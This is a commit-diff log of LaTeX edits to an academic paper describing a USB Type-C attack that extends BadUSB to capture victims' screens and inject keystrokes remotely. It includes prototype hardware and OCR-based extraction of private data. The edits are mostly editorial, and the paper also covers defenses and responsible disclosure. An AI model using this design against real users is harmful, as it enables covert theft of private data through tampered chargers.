+be transmitted through the USB interface. JFC~\cite{JFC}, short for Juicy Filming Attacks is such a work that abuses this standard and exfiltrate video data
 from the victim without permission. However, in JFC, this data exfiltration is not
@@
 It is worth noting that our \tool is different from JFC~\cite{JFC}.
-Firstly, Juice Filming Attacks can not control the attacked device, but can only video-capture user inputs during charging.
-However, our \tool can monitor the screen at the same time as controling the attacked device, which enhances the efficiency of stealing users’ private data.
-Second, we design an prototype to attack in real time remotely.
-Third, the scope of \tool is wider, \tool also poses a threat to laptops that charged with use USB-C interface.
+Juice Filming Attacks can not control the attacked device, it can only video-capture user inputs during charging.
+However, our \tool can control the attacked device at the same time as monitoring the screen, which enhances the efficiency of stealing users' private data.
 
@@
 performed manually, thus the malicious devices will be detected for making a different claim 
-that does not match the authorization results. USBeSafe\cite{usbesafe} analyses the 
+that does not match the authorization results. 
+USBeSafe\cite{usbesafe} analyses the 
 feature vector constructed from with data collected from USB Request Block(URBs), 
@@
 interfaces during enumerating, these defenses are sufficient for these attacks.
+Moreover, Mueller \emph{et al.}~\cite{MuellerZN19} improve the security without changing user experience.
+It can detect the presence of the user, block malicious device in the user's absenc until the session is unlocked.
 
@@
 of the academic community. As mentioned in Section~\ref{subsec:usb_attack}, there
-exists an attack called JFC (Juicy Film Charging)~\cite{JFC} which abuses the MHL
+exists an attack called JFC~\cite{JFC} which abuses the MHL
 standard to steal video stream from the victim. In order to mitigate this
@@
 
+		\makecell{USBeSafe~\cite{usbesafe}} & \makecell*[c]{\circleempty} & \circlefull & \circlefull &\circlefull& \circlefull\\
+		\hline
+
+		\makecell{Mueller \emph{et al.}~\cite{MuellerZN19}} & \makecell*[c]{\circleempty} & \circlefull & \circlefull &\circlehalf& \circlefull\\
+		\hline
+
 		\makecell{Neuner \emph{et al.}~\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty\\

### 2021-03-07 WOOT/Files/conclusion.tex
responsible disclosure fixed

@@
 
-As future work, we will further explore the potential of \textit{isolated UI
+As for future work, we will further explore the potential of \textit{isolated UI
 rendering} and implement it on a customized operating system. Moreover, we also
@@
 
-\section{Responsive Disclosure}
+\section{Responsible Disclosure}
 
-Responsive disclosure have already been carried out, we have already contacted the affected vendors through proper channel and are waiting for mitigation being deployed.
+Responsible disclosure have already been carried out, we have already contacted Huawei and Apple through proper channel and are waiting for mitigation being deployed.
+By now, we have already heard from Huawei PSIRT who has already been analyzing this security issue while Apple has not responded yet.

### 2021-03-07 WOOT/Files/background.tex
add \mbox around certain word

@@
 %\noindent\outline{USB2.0}\\
-In 2000, USB 2.0~\cite{usb20} specification was released. With high speed (480
-Mbit/s) mode introduced, printers, cameras, CD-ROM drives, and network cards were
+In 2000, USB 2.0~\cite{usb20} specification was released. With high speed \mbox{(480
+Mbit/s)} mode introduced, printers, cameras, CD-ROM drives, and network cards were
 supported in this revision. Such a high data transfer rate also gave rise to the
@@
 	\includegraphics[width=0.7\linewidth]{./Figs/usb_conn.png}
-	\caption{USB 1.x \& 2.x Connector}
+	\caption{USB 1.x \& 2.x Connector.}
 	\label{fig:usb_conn}
@@
 As illustrated in Figure~\ref{fig:usb_conn}, the original USB 1.x \& 2.x
-connector only has two pins for data transferring (D+ \& D-), which has
-significantly limited data transfer rate (5 Gbits/s Max) and cannot support for
-peripherals like DisplayPort (10.8 Gbit/s Min). Apart from that, support for
+connector only has two pins for data transferring \mbox{(D+ \& D-)}, which has
+significantly limited data transfer rate \mbox{(5 Gbits/s Max)} and cannot support for
+peripherals like DisplayPort \mbox{(10.8 Gbit/s Min)}. Apart from that, support for
 other peripherals also require dedicated transferring lane as their standards
@@
 	\includegraphics[width=\linewidth]{./Figs/usb_c_conn.png} 
-	\caption{USB Type C Connector} 
+	\caption{USB Type-C Connector.} 
 	\label{fig:usb_c_conn} 
@@
 of the USB 3.x protocol. As presented in Figure~\ref{fig:usb_c_conn}, Type-C added
-two high-speed data lanes (TRX1 \& TRX2) and kept the original data lane (D+ \&
-D-). The added lanes are used exclusively to support peripherals like
+two high-speed data lanes \mbox{(TRX1 \& TRX2)} and kept the original data lane \mbox{(D+ \&
+D-)}. The added lanes are used exclusively to support peripherals like
 DisplayPort while the kept data lane transfers USB packets.
@@
 During the development of USB specification, security was rarely considered. As
-the USB-IF believes it is the duty of original equipment manufacturers (OEMs)
+the USB-IF believes it is the duty of original equipment manufacturers \mbox{(OEMs)}
 to decide whether security features should be implemented~\cite{usbsec}. But the divergent implementations give a chance for attacks like
@@
 	\hline
-	1996 & USB 1.x~\cite{usb10,usb11} & Keyboard, Mouse... & 1.5 Mbit/s or 12 Mbit/s & HID Emulating(BadUSB)~\cite{badusb} \\
+	1996 & USB 1.x~\cite{usb10,usb11} & Keyboard, Mouse... & 1.5 Mbit/s or 12 Mbit/s & HID Emulating (BadUSB)~\cite{badusb} \\
 	\hline

### 2021-03-07 WOOT/BadUSBC.tex
fuck me with acronyms please

@@
 
+\newacro{USB}{Universal Serial Bus}
+\newacro{HID}{Human Interface Device}
+\newacro{UI}{User Interface}
+\newacro{PnP}{Plug-and-Play}
+\newacro{OEM}{Original Equipment Manufacturer}
+\newacro{DoS}{Denial of Service}
+\newacro{MHL}{Mobile High-Definition Link}
+\newacro{URB}{USB Request Block}
+\newacro{OCR}{Optical Character Recognition}
+\newacro{GUI}{Graphical User Interface}
+
 \begin{abstract}
 
-The security of USB protocol has been paid extensive attention to because of its
-    wide usage.  Due to the \textit{trust-by-default} characteristics, USB
+The security of \ac{USB} protocol has been paid extensive attention to because of its
+    wide usage.  Due to the \textit{trust-by-default} characteristics, \ac{USB}
     security has caused serious problems.  For example, a well-known firmware
     attack, BadUSB, performs malicious operations on the victim hosts through
-    disguising normal USB devices as human interface devices like keyboards and
+    disguising normal \ac{USB} devices as human interface devices like keyboards and
     mice.  However, BadUSB suffers from several limitations.  Attackers cannot
     obtain the status of user interface to conduct precise attacks as well as get the visual feedback of their attacks.  In this work, we
-    extended BadUSB to support the new features of USB Type-C and proposed a
+    extended BadUSB to support the new features of \ac{USB} Type-C and proposed a
     multi-mode attack model, \tool.  It obtains UI status to make attacks more 
     precise and effective.  To the best of our knowledge, \tool is the first attack model
-    utilizing USB Type-C.  To validate the usability and effectiveness, we
+    utilizing \ac{USB} Type-C.  To validate the usability and effectiveness, we
     conducted extensive experiments and a user study on a real-life attack
@@
 \end{IEEEkeywords}
+
+\acresetall
 

### 2021-03-07 WOOT/Files/background.tex
fuck me with acronyms please

@@
 
-We first introduce the development of USB specification and emphasize the key
+We first introduce the development of \ac{USB} specification and emphasize the key
 points adopted in this work. We also organized a brief timeline for introducing
@@
 %\noindent\outline{USB1.x}\\
-Proposed in 1996, USB 1.0~\cite{usb10} was developed to provide a unified
+Proposed in 1996, \ac{USB} 1.0~\cite{usb10} was developed to provide a unified
 interface and thus reducing the cost of reconfiguring the software. It is
@@
 %\noindent\outline{HID Protocol}\\
-Right after one year of the appearance of USB 1.0, a standard named HID (Human
-Interface Device)~\cite{hid} was born based on USB. HID is
+Right after one year of the appearance of \ac{USB} 1.0, a standard named \acf{HID}~\cite{hid} was born based on \ac{USB}. \ac{HID} is
 designed with to unify the implementation for devices like mice,
@@
 represent its location while the mouse of Company B uses relative displacement.
-This means every device needs its own driver to work. After HID, users only need to
-write one driver for an entire class of HIDs. Furthermore, HID standard also
-requires all devices to be PnP (\emph{Plug-and-Play}), which is indeed
+This means every device needs its own driver to work. After \ac{HID}, users only need to
+write one driver for an entire class of \acs{HID}. Furthermore, \ac{HID} standard also
+requires all devices to be \ac{PnP}, which is indeed
 convenient but insecure too.
 
-In 1998, the first widely supported USB protocol was born. USB1.1~\cite{usb11}
+In 1998, the first widely supported \ac{USB} protocol was born. \ac{USB} 1.1~\cite{usb11}
 provided two data transfer rates which are low speed (1.5 Mbit/s) and full
@@
 %\noindent\outline{USB2.0}\\
-In 2000, USB 2.0~\cite{usb20} specification was released. With high speed \mbox{(480
+In 2000, \ac{USB} 2.0~\cite{usb20} specification was released. With high speed \mbox{(480
 Mbit/s)} mode introduced, printers, cameras, CD-ROM drives, and network cards were
@@
 transferring data around~\cite{sok}. Though various peripherals were supported
-in USB 2.0, there was no reliable way to identify the type of device. This
+in \ac{USB} 2.0, there was no reliable way to identify the type of device. This
 security flaw allowed attacks like BadUSB~\cite{badusb,rubber}.
@@
 %\noindent\outline{USB3.x}\\
-USB 3.0~\cite{usb30} was announced in 2008, with a super speed (5 Gbit/s) data
+\ac{USB} 3.0~\cite{usb30} was announced in 2008, with a super speed (5 Gbit/s) data
 transfer rate. Like its predecessor, more classes of peripherals were supported
-in this revision. In 2013, the USB Type-C connector standard was introduced as a
-part of USB 3.1~\cite{usb31}, providing a unified connector type for
-PowerDelivery (PD), Thunderbolt, DisplayPort, and HDMI.  Yet no improvement of
+in this revision. In 2013, the \ac{USB} Type-C connector standard was introduced as a
+part of \ac{USB} 3.1~\cite{usb31}, providing a unified connector type for
+PowerDelivery, Thunderbolt, DisplayPort, and HDMI.  Yet no improvement of
 security was introduced in 3.x revisions, meaning any device claiming
@@
 such a multi-propose connector unprotected is insecure and allows attacks like
-this work \tool. In 2017, USB 3.2~\cite{usb32} was released, doubling the data
+this work \tool. In 2017, \ac{USB} 3.2~\cite{usb32} was released, doubling the data
 transfer rate (20 Gbit/s).
@@
 	\includegraphics[width=0.7\linewidth]{./Figs/usb_conn.png}
-	\caption{USB 1.x \& 2.x Connector.}
+	\caption{\ac{USB} 1.x \& 2.x Connector.}
 	\label{fig:usb_conn}
@@
 
-As illustrated in Figure~\ref{fig:usb_conn}, the original USB 1.x \& 2.x
+As illustrated in Figure~\ref{fig:usb_conn}, the original \ac{USB} 1.x \& 2.x
 connector only has two pins for data transferring \mbox{(D+ \& D-)}, which has
@@
 other peripherals also require dedicated transferring lane as their standards
-are not compatible with USB in most cases.
+are not compatible with \ac{USB} in most cases.
 
@@
 	\includegraphics[width=\linewidth]{./Figs/usb_c_conn.png} 
-	\caption{USB Type-C Connector.} 
+	\caption{\ac{USB} Type-C Connector.} 
 	\label{fig:usb_c_conn} 
@@
 Thus, to provide support towards a wider range of peripherals, a 24-pins
-standard called USB Type-C~\cite{typec} is introduced in 2013 by USB-IF~\cite{usbif}. As it is designed to be double-sided, the number of actually usable
+standard called \ac{USB} Type-C~\cite{typec} is introduced in 2013 by \ac{USB}-IF~\cite{usbif}. As it is designed to be double-sided, the number of actually usable
 pins is halved. Nevertheless, this standard has largely enhanced the capability
-of the USB 3.x protocol. As presented in Figure~\ref{fig:usb_c_conn}, Type-C added
+of the \ac{USB} 3.x protocol. As presented in Figure~\ref{fig:usb_c_conn}, Type-C added
 two high-speed data lanes \mbox{(TRX1 \& TRX2)} and kept the original data lane \mbox{(D+ \&
 D-)}. The added lanes are used exclusively to support peripherals like
-DisplayPort while the kept data lane transfers USB packets.
+DisplayPort while the kept data lane transfers \ac{USB} packets.
 
 %\noindent\outline{Security Problem}\\
-During the development of USB specification, security was rarely considered. As
-the USB-IF believes it is the duty of original equipment manufacturers \mbox{(OEMs)}
+During the development of \ac{USB} specification, security was rarely considered. As
+the \ac{USB}-IF believes it is the duty of \acp{OEM}
 to decide whether security features should be implemented~\cite{usbsec}. But the divergent implementations give a chance for attacks like
@@
 	\hline
-	1996 & USB 1.x~\cite{usb10,usb11} & Keyboard, Mouse... & 1.5 Mbit/s or 12 Mbit/s & HID Emulating (BadUSB)~\cite{badusb} \\
+	1996 & \ac{USB} 1.x~\cite{usb10,usb11} & Keyboard, Mouse... & 1.5 Mbit/s or 12 Mbit/s & \ac{HID} Emulating (BadUSB)~\cite{badusb} \\
 	\hline
-	2000 & USB 2.0~\cite{usb20} & Flash Drive, High-Definition Link, CD Driver... & 480 Mbit/s & Autorun Attack~\cite{duqu}, Juice Filming~\cite{JFC,JFCImpact} \\
+	2000 & \ac{USB} 2.0~\cite{usb20} & Flash Drive, High-Definition Link, CD Driver... & 480 Mbit/s & Autorun Attack~\cite{duqu}, Juice Filming~\cite{JFC,JFCImpact} \\
 	\hline
-	2008 & USB 3.0~\cite{usb30} & / & 5 Gbit/s & / \\
+	2008 & \ac{USB} 3.0~\cite{usb30} & / & 5 Gbit/s & / \\
 	\hline
-	2013 & USB 3.1~\cite{usb31} & HDMI, DisplayPort, ThunderBolt... & 10 Gbit/s & \tool \\
+	2013 & \ac{USB} 3.1~\cite{usb31} & HDMI, DisplayPort, ThunderBolt... & 10 Gbit/s & \tool \\
 	\hline
-	2017 & USB 3.2~\cite{usb32} & / & 20 Gbit/s & / \\
+	2017 & \ac{USB} 3.2~\cite{usb32} & / & 20 Gbit/s & / \\
 	\hline
@@
 	\linebreak
-\caption{USB Protocol Timeline.}
+\caption{\ac{USB} Protocol Timeline.}
 \label{table:usb_timeline}

### 2021-03-07 WOOT/Files/badusb.tex
fuck me with acronyms please

@@
 We build our threat model on the basic assumptions that common users without
-technical background would not treat normal-looking USB device as malicious and be cautious about them. This assumption is consistent with existing works~\cite{JFCImpact}. Moreover, we neglect the
-effect of notifications from USB devices, as users may not have the knowledge to fully understand such notifications. In
+technical background would not treat normal-looking \ac{USB} device as malicious and be cautious about them.
+This assumption is consistent with existing works~\cite{JFCImpact}.
+Moreover, we neglect the
+effect of notifications from \ac{USB} devices, as users may not have the knowledge to fully understand such notifications. In
 fact, during our experiment, no device had security notifications raised about
-suspicious USB devices and only mobile devices had raised a charging notification
+suspicious \ac{USB} devices and only mobile devices had raised a charging notification
 about our \tool, which may not be a sufficient warning for users.
 
-We also assume the victim's device is equipped with fully functional USB 3.x
-protocol and USB Type-C connector. As the USB 3.x standard is
+We also assume the victim's device is equipped with fully functional \ac{USB} 3.x
+protocol and \ac{USB} Type-C connector. As the \ac{USB} 3.x standard is
 common nowadays, this assumption can be fulfilled in recent
@@
 Many of these take advantage of the \textit{trust-by-default} policy of PC,
-pretend to be normal HID devices and utilize USB protocol to perform attacks.
+pretend to be normal \ac{HID} devices and utilize \ac{USB} protocol to perform attacks.
 However, these attacks suffer from various drawbacks: \ding{182} attackers can
-only simulate limited types of devices such as HIDs (like keyboards and mice)
+only simulate limited types of devices such as \acp{HID} (like keyboards and mice)
 and disks, which makes the attacks less effective; \ding{183} accurate attacks
-could not be performed due to lack of user interface (UI) status. Whatever HID the
-attackers simulate their USB devices to be, they could not obtain the UI to
+could not be performed due to lack of \ac{UI} status. Whatever \ac{HID} the
+attackers simulate their \ac{USB} devices to be, they could not obtain the \ac{UI} to
 check the status information, which makes it nearly impossible to carry out
@@
 
-In this work, we utilize the new features of USB 3.x~\cite{usb31,usb32} to
+In this work, we utilize the new features of \ac{USB} 3.x~\cite{usb31,usb32} to
 address the problem above.  Benefiting from the latest protocol, we simulate
@@
 %explain the figure. What are the boxes? Where is victim? Where is the attacker?
-%The list below only shows the internal components in the malicious USB device.
+%The list below only shows the internal components in the malicious \ac{USB} device.
 %We might also consider to explain this in the Figure caption.}
@@
 
-	\item\underline{USB 3.x Hub} exports the USB 3.x connector into various ports, like DisplayPort, USB 2.0 port, etc.
+	\item\underline{USB 3.x Hub} exports the \ac{USB} 3.x connector into various ports, like DisplayPort, \ac{USB} 2.0 port, etc.
 
@@
 
-	\item\underline{HID Emulator} emulates HID device which can be controlled from the attacker.
+	\item\underline{\ac{HID} Emulator} emulates \ac{HID} device which can be controlled from the attacker.
 
-	\item\underline{Single Board Computer} processes video stream from the victim via the Video Capture Card or sends commands to the victim via HID Emulator.
+	\item\underline{Single Board Computer} processes video stream from the victim via the Video Capture Card or sends commands to the victim via \ac{HID} Emulator.
 
@@
 
-\textbf{HID Emulation Mode.} This mode majorly relies on the ``HID Emulator'' in the Figure~\ref{fig:attack_model} to
-send constructed HID packet to the victim. These constructed HID packets are
+\textbf{\ac{HID} Emulation Mode.} This mode majorly relies on the ``\ac{HID} Emulator'' in the Figure~\ref{fig:attack_model} to
+send constructed \ac{HID} packet to the victim. These constructed \ac{HID} packets are
 interpreted by the victim as valid keystrokes and mouse moves. Thus, the
@@
 
-First, as \tool has established a feedback channel using USB 3.2 protocol, when performing keystroke and mouse movement injection, attacker can obtain real-time feedback from the victim's devices.
+First, as \tool has established a feedback channel using \ac{USB} 3.2 protocol, when performing keystroke and mouse movement injection, attacker can obtain real-time feedback from the victim's devices.
 This feedback allows an attacker to tell whether the previous attack succeeded and decide what to perform next.
@@
 emulation and automation were not supported by the original version of BadUSB.
-Yet with the video output support from USB 3.x, our \tool implements a
-full-functional mouse emulation. This function enables attacks toward pure GUI
+Yet with the video output support from \ac{USB} 3.x, our \tool implements a
+full-functional mouse emulation. This function enables attacks toward pure \ac{GUI}
 programs and shows attacks in the mobile attack scenarios. Details can
@@
 \textbf{Video Capture Mode.} \tool under this mode does not emulate other
-USB device and solely relies on the video stream function of USB 3.x; it uses
+USB device and solely relies on the video stream function of \ac{USB} 3.x; it uses
 ``Video Capture'' component as shown in the Figure~\ref{fig:attack_model} to transmit the stream to the embedded ``Single Board Computer''.
@@
 and a keyboard/mouse emulation. Thus with all components enabled, not only
-the victim's device treat \tool as an external display, but also a valid HID
+the victim's device treat \tool as an external display, but also a valid \ac{HID}
 input source. Hence we can archive complete hijack of victim's device.
@@
 meanwhile, \tool also receives keystrokes and mouse movement from the attacker
-through GSM/WiFi and replays them to the victim by the USB emulation.
+through GSM/WiFi and replays them to the victim by the \ac{USB} emulation.
 

### 2021-03-07 WOOT/Files/conclusion.tex
fuck me with acronyms please

@@
 
-Leveraging the new features of USB 3.x~\cite{usb30,usb31,usb32}, we explore a
+Leveraging the new features of \ac{USB} 3.x~\cite{usb30,usb31,usb32}, we explore a
 new attack scheme named \tool and three attack modes. Each of these three modes
-has its own strength and use scenarios. The HID Emulation mode largely extends the
+has its own strength and use scenarios. The \ac{HID} Emulation mode largely extends the
 original BadUSB and successfully bypasses existing defenses. The video capture mode proved practical and powerful in the user study, as it extracts

### 2021-03-07 WOOT/Files/countermeasure.tex
fuck me with acronyms please

@@
 
-\textbf{Distrust-by-Default.} Most security issues of USB protocol are due to
+\textbf{Distrust-by-Default.} Most security issues of \ac{USB} protocol are due to
 its \textit{trust-by-default} assumption; \tool also relies on this feature to work.
@@
 
-\textbf{Isolated UI Rendering.} During our experiments, we noticed that \tool
+\textbf{Isolated \ac{UI} Rendering.} During our experiments, we noticed that \tool
 is actually unable to redirect out the locking screen keyboard from the iPad
@@
 This mechanism has inspired us to propose a new defense against our \tool
-called \emph{Isolated UI Rendering}. As illustrated in
-Figure~\ref{fig:isolated_ui}, we designed two separated UI render layers and corresponding drivers, one
+called \emph{Isolated \ac{UI} Rendering}. As illustrated in
+Figure~\ref{fig:isolated_ui}, we designed two separated \ac{UI} render layers and corresponding drivers, one
 is secure the other is insecure. When an application requires to render, it can
@@
 Thus, the `password' and `keyboard' are not rendered on untrusted screen.
- \fengwei{we need more text to describe the figure}.
 
@@
 	\includegraphics[width=\linewidth]{./Figs/isolated_ui.png}
-	\caption{Isolated UI Rendering}%\shuqing{Maybe we can increase the font?}
+	\caption{Isolated \ac{UI} Rendering}%\shuqing{Maybe we can increase the font?}
 	\label{fig:isolated_ui}

### 2021-03-07 WOOT/Files/discussion.tex
impl free of GoodUSB
fuck me with acronyms please

--- 2021-01-30 WOOT/Files/discussion.tex
@@
 \subsection{Limitation}
-
+There exist multiple limitations of \tool.
+To begin with, when \tool is attached, the victim's device may not be set to mirror the screen.
+Depending on victim's settings, the \tool may be used as an extended monitor or not be enabled at all.
+Additionally, some smartphone vendor (e.g.
+Huawei and Smartisan) provide a Desktop Mode to users, which displays a desktop on external screen instead of mirroring.
+In these cases, \tool is either easily noticeable to victim or disabled.
+Apart from that, we also noticed that in most devices, when an external monitor is connected to the device, there will be notifications about the monitor.
+In iPad, there is a small blue icon on the notification bar.
+In Windows 10, there is a pop-up for user to select the functionality of the external monitor.
+In latter case of a pop-up, \tool can dismiss it by injecting keystrokes and mouse movements.
+But they are still noticeable by the victim.
+Also, it cannot be ignored that DisplayPort over \ac{USB} is not available on all devices.
+When selecting devices to test \tool, we find that many smartphones equipped with USB-C connector does not support \ac{USB} 3.2 protocol.
+This lack of support further limited \tool.
+\begin{comment}
 There exist multiple limitations of \tool.  To begin with, \tool can only gain
@@
 approaches that use external hardware for authorization.  Moreover, most of
-the devices will prompt users to give authentication to the USB devices or
+the devices will prompt users to give authentication to the \ac{USB} devices or
 select one of the functional modes after they are plugged in.  Though some of
@@
 %and application scenarios.}
-The USB protocol is used widely as introduced in the preceding sections.  As the
+The \ac{USB} protocol is used widely as introduced in the preceding sections.  As the
 technologies develop rapidly, more and more devices will be equipped with USB-C
 capabilities, which makes \tool more influential.  Due to the neglect to
-check the security of plugged-in USB devices of non-professional users, \tool
+check the security of plugged-in \ac{USB} devices of non-professional users, \tool
 can be hardly detected by them while attacks are performing.  The popularity
-and universality of public USB devices, including sharing power banks, even
+and universality of public \ac{USB} devices, including sharing power banks, even
 increase such risks.  Moreover, \tool provides a better way for traditional

### 2021-03-07 WOOT/Files/experiment.tex
fuck me with acronyms please

@@
 To evaluate the effectiveness of \tool in different modes, we conducted three
-experiments on \tool using devices with USB Type-C capabilities from different
-OEMs, including a mobile phone, a tablet, and a laptop.
+experiments on \tool using devices with \ac{USB} Type-C capabilities from different
+\acp{OEM}, including a mobile phone, a tablet, and a laptop.
 
@@
 Computer inside \tool, which is powerful enough to process video data and has
-an onboard WiFi chip. As for the HID Emulator, we use an Atmel ATMEGA32U4 board~\cite{atmel}
-with USB protocol support, which is able to emulate multiple HID devices
-with our modified firmware. About the USB 3.x Hub, we use one from the
-UGREEN~\cite{ugreen}, which supports HDMI, USB 2.0, and many other exported peripherals.
+an onboard WiFi chip. As for the \ac{HID} Emulator, we use an Atmel ATMEGA32U4 board~\cite{atmel}
+with \ac{USB} protocol support, which is able to emulate multiple \acp{HID}
+with our modified firmware. About the \ac{USB} 3.x Hub, we use one from the
+UGREEN~\cite{ugreen}, which supports HDMI, \ac{USB} 2.0, and many other exported peripherals.
 Apart from these essential parts, we also use an auxiliary power-bank to
@@
 
-\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone as the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\scriptsize{1}} is the USB 3.x Hub; \circled[text=white,fill=myblue]{\scriptsize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\scriptsize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\scriptsize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\scriptsize{5}} is an Atmel ATMEGA32U4 board as the HID Emulator.
+\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone as the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\scriptsize{1}} is the \ac{USB} 3.x Hub; \circled[text=white,fill=myblue]{\scriptsize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\scriptsize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\scriptsize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\scriptsize{5}} is an Atmel ATMEGA32U4 board as the \ac{HID} Emulator.
 %\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,
@@
 	\circled[text=white,fill=myblue]{\scriptsize{A}} Victim's Device    &\circled[text=white,fill=myblue]{\scriptsize{B}}~\tool\\
-	\circled[text=white,fill=myblue]{\footnotesize{1}} USB 3.x Hub        &\circled[text=white,fill=myblue]{\footnotesize{2}} Raspberry Pi 4B\\
+	\circled[text=white,fill=myblue]{\footnotesize{1}} \ac{USB} 3.x Hub        &\circled[text=white,fill=myblue]{\footnotesize{2}} Raspberry Pi 4B\\
 	\circled[text=white,fill=myblue]{\footnotesize{3}} Auxiliary Power Bank &\circled[text=white,fill=myblue]{\footnotesize{4}} Video Capture\\
@@
 In the experiment of HID emulator mode, we used {Lenovo Xiaoxin Pro 13
-2020}, a PC in Windows 10 (OS Build 18363.1379) with two USB Type-C interfaces as the
+2020}, a PC in Windows 10 (OS Build 18363.1379) with two \ac{USB} Type-C interfaces as the
 target device.
@@
 During the experiment of privacy extraction via our video capture mode, we chose \textit{HUAWEI P30 (ELE-AL00)}, a
-smartphone in EMUI 11.0.0.135(C00E128R2P5) (Android 10.0 based) with a USB Type-C interface, as the
+smartphone in EMUI 11.0.0.135(C00E128R2P5) (Android 10.0 based) with a \ac{USB} Type-C interface, as the
 target device.  In the privacy extraction experiment, \tool passively captured video
@@
 information from the video stream.  When the victim viewed text or photos with
-text, \tool used the techniques of Optical Character Recognition (OCR)  to
+text, \tool used the techniques of \ac{OCR}  to
 extract text from corresponding video frames. In this experiment, the attacker had
@@
 To test the capability of the full control mode, we chose iPad Pro (3rd
-	generation), a tablet in iOS 14.4 (Build 18D52) with a USB Type-C interface, as the target
-device in this experiment.  Besides disguising as normal HID devices like a
+	generation), a tablet in iOS 14.4 (Build 18D52) with a \ac{USB} Type-C interface, as the target
+device in this experiment.  Besides disguising as normal \acp{HID} like a
 conventional BadUSB~\cite{badusb}, \tool also transmitted real-time video
@@
 	\linebreak
-	\caption{Examples of Searching OCR Results with Keywords.}
+	\caption{Examples of Searching \ac{OCR} Results with Keywords.}
 	\label{tab:ocr_keyword_example}
@@
 \hongyi{Better way to express this?}
-First, under HID emulator mode, the attacker is able to implant malware and backdoor script into victims' devices.
+First, under \ac{HID} emulator mode, the attacker is able to implant malware and backdoor script into victims' devices.
 Moreover, using video capture mode, once the victims access their sensitive data like QR payment  code or album, their sensitive data will be immediately transmitted via \tool to the attacker.
@@
 To obtain data close to real-life, they are requested to use phones like when they use the normal shared power banks.
-After every case study experiment, we introduced to him/her our attack, showed him/her the only raw files (video recorded and corresponding OCR results), told him/her to analyze the screen recordings and replace certain characters of the private data that appear in the OCR result with asterisks.
+After every case study experiment, we introduced to him/her our attack, showed him/her the only raw files (video recorded and corresponding \ac{OCR} results), told him/her to analyze the screen recordings and replace certain characters of the private data that appear in the \ac{OCR} result with asterisks.
 It protects their privacy and is also a mark for us to confirm that the data we find contains their private data.
-After he/she made sure their private data is not at risk, he/she can destroy the only raw files, give the desensitized OCR result back to us.
+After he/she made sure their private data is not at risk, he/she can destroy the only raw files, give the desensitized \ac{OCR} result back to us.
 \shuqing{Do we need to mention that agreement the conference required here?}
@@
 After collecting the captured videos of the mobile phone, we analyzed the videos both automatically and manually.
-During the automatic analysis, we used scripts to perform OCR recognition for each frame in the recorded videos and stored all of the OCR results in a database.
+During the automatic analysis, we used scripts to perform \ac{OCR} recognition for each frame in the recorded videos and stored all of the \ac{OCR} results in a database.
 In total, there are $94,058$ entries of data collected among 10 volunteers.

### 2021-03-07 WOOT/Files/introduction.tex
fuck me with acronyms please

@@
 
-The Universal Serial Bus (USB) protocol has become popular around the world
+The \ac{USB} protocol has become popular around the world
 since its appearance, as it provides a unified and easy-to-use approach for a
 large range of devices to communicate with each other.  From version 1.0 till
-now, USB specification has evolved rapidly and offered more and more
-functionalities.  Nowadays, devices with USB support are ubiquitous.
+now, \ac{USB} specification has evolved rapidly and offered more and more
+functionalities.  Nowadays, devices with \ac{USB} support are ubiquitous.
 
-On the other side of the coin, the security of USB has caused serious problems.
-The designers of the USB protocol did not care much about security issues as
+On the other side of the coin, the security of \ac{USB} has caused serious problems.
+The designers of the \ac{USB} protocol did not care much about security issues as
 they wanted to make an easy-to-use protocol.  There are more than four hundred
-vulnerabilities referencing USB on CVE list~\cite{website:CVE-list}.  As a
+vulnerabilities referencing \ac{USB} on CVE list~\cite{website:CVE-list}.  As a
 result, many attackers exploit these vulnerabilities and the
-\textit{trust-by-default} characteristics of USB to conduct attacks, which puts
-the privacy and financial security of USB users in danger~\cite{sok}.
+\textit{trust-by-default} characteristics of \ac{USB} to conduct attacks, which puts
+the privacy and financial security of \ac{USB} users in danger~\cite{sok}.
 
@@
 are conducted through modification of the device firmware, which will disguise
-normal USB devices as other types of devices that are \textit{trust-by-default}
-by the hosts.  Typical simulated devices include HID (short for human interface
-devices, including keyboards, mice, etc.) and disks.  Utilizing BadUSB,
+normal \ac{USB} devices as other types of devices that are \textit{trust-by-default}
+by the hosts.  Typical simulated devices include \ac{HID}~\cite{hid} and disks.  Utilizing BadUSB,
 attackers can pretend themselves as normal users, typing malicious commands to
@@
 private data from disks.  Such attacks can easily escape from traditional
-anti-virus software since it is hard to distinguish them from normal USB
+anti-virus software since it is hard to distinguish them from normal \ac{USB}
 devices.
@@
 capabilities of BadUSB attacks.  When performing attacks on another host, the
-attackers can not obtain the current user interface (UI) status which limits
+attackers can not obtain the current \ac{UI} status which limits
 them from taking subsequent moves.  For example, it is hard for attackers to
-locate specific functional UI patterns like buttons and links on victim
-computers by disguising USB devices like mice.  That explains why typical
+locate specific functional \ac{UI} patterns like buttons and links on victim
+computers by disguising \ac{USB} devices like mice.  That explains why typical
 BadUSB attacks often only stay in the command line, using commands to download
@@
 anti-virus software or firewall due to the usage of the host network.  (2) To
-our best knowledge, existing BadUSB attacks only utilize the features of USB
-2.0.  The release of USB 3.0 makes USB more powerful, with a higher
+our best knowledge, existing BadUSB attacks only utilize the features of \ac{USB}
+2.0.  The release of \ac{USB} 3.0 makes \ac{USB} more powerful, with a higher
 transmission rate for data and the support towards a larger range of
 peripherals including DisplayPort, HDMI, PowerDelivery, etc.  BadUSB attacks
-can become more effective with the help of newly supported features in USB 3.0.
+can become more effective with the help of newly supported features in \ac{USB} 3.0.
 (3) There have emerged multiple efficacious countermeasures after the
 appearance of BadUSB.  For example, GoodUSB offers a defense method by limiting
-the functions of USB devices to users' expectations~\cite{tian2015defending}.
+the functions of \ac{USB} devices to users' expectations~\cite{tian2015defending}.
